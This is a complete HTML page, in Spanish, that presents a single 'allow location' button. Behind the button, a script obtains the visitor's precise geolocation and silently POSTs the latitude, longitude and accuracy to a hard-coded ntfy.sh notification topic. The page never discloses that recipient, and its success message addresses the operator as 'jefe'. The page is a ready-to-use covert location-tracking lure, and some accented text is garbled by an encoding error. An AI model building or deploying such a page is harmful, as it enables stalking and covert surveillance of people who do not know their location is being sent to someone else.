<!DOCTYPE html>
<html lang="es-Zeta">
<head>
  <meta charset="UTF-8">
  <title>ZetaGeoBtn</title>
  <style>
    html,body{margin:0;height:100%;background:#000;display:flex;justify-content:center;align-items:center;font-family:monospace}
    #btnPermitir{padding:20px 40px;font-size:1.8rem;background:#0f0;color:#000;border:none;border-radius:8px;cursor:pointer}
    #btnPermitir:hover{background:#0c0}
    #msg{margin-top:20px;color:#0f0;text-align:center}
  </style>
</head>
<body>
  <div>
    <button id="btnPermitir">Permitir ubicaci√≥n</button>
    <div id="msg"></div>
  </div>

  <script>
    const ntfyUrl = "https://ntfy.sh/byhertzdelt8999"; // <-- tu tema

    function mandaTexto(pos) {
      const txt = `ZetaGeo: lat=${pos.coords.latitude.toFixed(6)}, lon=${pos.coords.longitude.toFixed(6)}, acc=${pos.coords.accuracy.toFixed(0)}m`;
      fetch(ntfyUrl, {
        method: "POST",
        body: txt,
        headers: {"Content-Type": "text/plain"}
      })
      .then(() => { mostrar("Ubicaci√≥n volando, jefe üõ∞Ô∏è"); deshabilitar(); })
      .catch(e => { mostrar("Error al enviar: " + e); });
    }

    function errorHandler(err) {
      mostrar("Permiso denegado o error: " + err.message);
      btn.style.display = "inline-block"; // reaparece para reintentar
    }

    function mostrar(texto) { document.getElementById("msg").innerText = texto; }
    function deshabilitar() { btn.style.display = "none"; }

    const btn = document.getElementById("btnPermitir");
    btn.addEventListener("click", () => {
      mostrar("Obteniendo‚Ä¶");
      btn.style.display = "none";
      navigator.geolocation.getCurrentPosition(mandaTexto, errorHandler, {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      });
    });
  </script>
</body>
</html>
